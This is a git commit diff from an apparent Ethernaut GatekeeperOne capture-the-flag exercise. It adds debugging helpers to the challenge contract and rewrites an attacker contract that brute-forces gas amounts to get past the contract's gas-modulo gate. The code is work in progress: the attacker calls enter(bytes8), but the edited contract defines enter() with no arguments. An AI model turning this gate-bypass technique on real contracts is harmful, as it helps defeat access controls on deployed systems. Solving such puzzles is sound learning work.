7c8fc5215d09cf7418f1c918c69ef32d08c079e2
grahamtallen <grahamtallen94@gmail.com>
2025-08-12 22:30:57 -0700

    debugging gas used by modifiers

--- contracts/GatekeeperOne.sol
+++ contracts/GatekeeperOne.sol
@@ -3,16 +3,26 @@ pragma solidity ^0.8.0;
 
 contract GatekeeperOne {
     address public entrant;
+    uint256 public gasRemaining;
 
     modifier gateOne() {
-        require(msg.sender != tx.origin);
+        require(msg.sender != tx.origin, "failed gate 1");
         _;
     }
 
     modifier gateTwo() {
-        require(gasleft() % 8191 == 0);
+        require(gasleft() % 8191 == 0, "failed gate 2");
         _;
     }
+
+    function gateTwoFn() public gateOne returns (bool) {
+        // return true;
+        gasRemaining = gasleft();
+        // require(gasleft() % 8191 == 0, "failed gate 2");
+        return gasleft() % 8191 == 0;
+    }
+
+
 
     modifier gateThree(bytes8 _gateKey) {
         require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
@@ -21,7 +31,7 @@ contract GatekeeperOne {
         _;
     }
 
-    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    function enter() public gateOne gateTwo returns (bool) {
         entrant = tx.origin;
         return true;
     }
--- contracts/GatekeeperOneHacker.sol
+++ contracts/GatekeeperOneHacker.sol
@@ -9,20 +9,29 @@ contract GatekeeperOneHacker {
         gatekeeper = GatekeeperOne(_gatekeeper);
     }
 
-    function callGatekeeper() public {
-        bytes8 gateKey = 0x0000000000000000;
-        (bool success, bytes memory returndata) = address(gatekeeper).call{gas: 8191}(abi.encodeWithSignature("enter(bytes8)", gateKey));
-        if (!success) {
+    // Tries a range of gas values and returns the first gas amount that worked (or 0 if none)
+    function bruteForceEnter(bytes8 key, uint256 gasAmt) public returns (uint256) {
+        // const base = 8191;
+        // for (uint256 gasAmt = startGas; gasAmt <= endGas; gasAmt++) {
+            // uint256 finalGasAmount = gasAmount + 
+            (bool success, bytes memory returndata) = address(gatekeeper).call{gas: gasAmt}(abi.encodeWithSignature("enter(bytes8)", key));
+            if (success) {
+                return gasAmt;  // Found gas amount that passed gateTwo
+            }
+            if (!success) {
             if (returndata.length > 0) {
-                // Bubble up the original revert reason
+                // Bubble up revert reason from returndata
                 assembly {
                     let returndata_size := mload(returndata)
                     revert(add(32, returndata), returndata_size)
                 }
             } else {
-                revert("External call failed without reason");
+                revert("Call failed without revert reason");
             }
-        }
+}
+        // }
+        require(false, "No success in range");
+        return 0;
     }
 
     
